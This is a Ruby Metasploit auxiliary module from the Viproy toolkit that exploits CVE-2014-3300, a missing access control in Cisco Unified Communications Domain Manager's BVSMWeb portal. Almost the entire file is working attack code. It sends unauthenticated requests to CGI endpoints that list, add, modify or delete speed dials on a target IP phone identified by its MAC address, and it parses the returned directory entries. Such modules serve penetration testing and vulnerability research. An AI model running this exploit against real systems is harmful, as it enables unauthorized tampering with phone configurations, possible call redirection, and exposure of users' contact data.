##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      'Name'        => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
      'Description' => %q{
        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM)
        in Unified CDM Application Software before 10 does not properly implement access control,
        which allows remote attackers to modify user information. This vulnerability can be exploited
        for unauthorised speeddial manipulation using this module. This tool can be tested with the fake
        voss-xmlservice component of Viproy.
      },
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'References'     =>
          [
              ['CVE', '2014-3300'],
              ['BID', '68331'],
              ['Viproy Fake CUCDM Service', 'https://github.com/fozavci/viproy-voipkit/raw/master/external/voss-xmlservice.rb']
          ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
          [
              [ 'GET', {
                  'Description' => 'Getting the speeddials for the MAC address.'
              } ],
              [ 'MODIFY', {
                  'Description' => 'Modifying a speeddial for the MAC address.'
              } ],
              [ 'ADD', {
                  'Description' => 'Adding a speeddial for the MAC address.'
              } ],
              [ 'DELETE', {
                  'Description' => 'Deleting a speeddial for the MAC address.'
              } ],
              [ 'list', {
                  'Description' => 'List the actions that would be started'
              } ]
          ],
      'DefaultAction'  => 'GET'
    )

    register_options(
    [
      Opt::RPORT(80),
      OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
      OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
      OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
      OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
      OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),
    ], self.class)
  end

  def run
    uri = normalize_uri(target_uri.to_s)
    mac = Rex::Text.uri_encode(datastore["MAC"])
    name = Rex::Text.uri_encode(datastore["NAME"])
    position = Rex::Text.uri_encode(datastore["POSITION"])
    telno = Rex::Text.uri_encode(datastore["TELNO"])


    case action.name.upcase
      when 'MODIFY'
        print_status("Deleting Speed Dial of the IP phone")
        url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
        vprint_status("URL: "+url)
        status,res=send_rcv(url)
        if status != Exploit::CheckCode::Safe and res.body =~ /Deleted/
          print_good("Speed Dial #{position} is deleted successfully")
          print_status("Adding Speed Dial to the IP phone")
          url=uri+"/phonespeedialadd.cgi?name=#{name}&telno=#{telno}&device=SEP#{mac}&entry=#{position}&mac=#{mac}"
          vprint_status("URL: "+url)
          status,res=send_rcv(url)
          if status != Exploit::CheckCode::Safe and res.body =~ /Added/
            print_good("Speed Dial #{position} is added successfully")
          elsif res.body =~ /exist/
            print_error("Speed Dial is exist, change the position or choose modify!")
          else
            print_error("Speed Dial couldn't add!")
          end
        else
          print_error("Speed Dial is not found!")
        end
      when 'DELETE'
        print_status("Deleting Speed Dial of the IP phone")
        url=uri+"/phonespeeddialdelete.cgi?entry=#{position}&device=SEP#{mac}"
        vprint_status("URL: "+url)
        status,res=send_rcv(url)
        if status != Exploit::CheckCode::Safe and res.body =~ /Deleted/
          print_good("Speed Dial #{position} is deleted successfully")
        else
          print_error("Speed Dial is not found!")
        end
      when 'ADD'
        print_status("Adding Speed Dial to the IP phone")
        url=uri+"/phonespeedialadd.cgi?name=#{name}&telno=#{telno}&device=SEP#{mac}&entry=#{position}&mac=#{mac}"
        vprint_status("URL: "+url)
        status,res=send_rcv(url)
        if status != Exploit::CheckCode::Safe and res.body =~ /Added/
          print_good("Speed Dial #{position} is added successfully")
        elsif res.body =~ /exist/
          print_error("Speed Dial is exist, change the position or choose modify!")
        else
          print_error("Speed Dial couldn't add!")
        end
    else
      print_status("Getting Speed Dials of the IP phone")
      url=uri+"/speeddials.cgi?device=SEP#{mac}"
      vprint_status("URL: "+url)

      status,res=send_rcv(url)
      parse(res) if status != Exploit::CheckCode::Safe
    end

  end

  def send_rcv(uri)
    uri=normalize_uri(uri.to_s)
    res = send_request_cgi(
        {
            'uri'    => uri,
            'method' => 'GET',
        })
    if res and res.code == 200 and res.body =~ /Speed [D|d]ial/
      return Exploit::CheckCode::Vulnerable,res
    else
      print_error("Target appears not vulnerable!")
      return Exploit::CheckCode::Safe,res
    end
  end

  def parse(res)
    doc = REXML::Document.new(res.body)
    names=[]
    phones=[]

    list=doc.root.get_elements("DirectoryEntry")
    list.each {|lst|
      xlist=lst.get_elements("Name")
      xlist.each {|l| names << "#{l[0]}"}
      xlist=lst.get_elements("Telephone")
      xlist.each {|l| phones << "#{l[0]}" }
    }
    if names.size > 0
      names.size.times{|i| print_good("Position: "+names[i].split(":")[0]+"\tName: "+names[i].split(":")[1]+"\t"+"Telephone: "+phones[i])}
    else
      print_status("No Speed Dial detected")
    end
  end
end
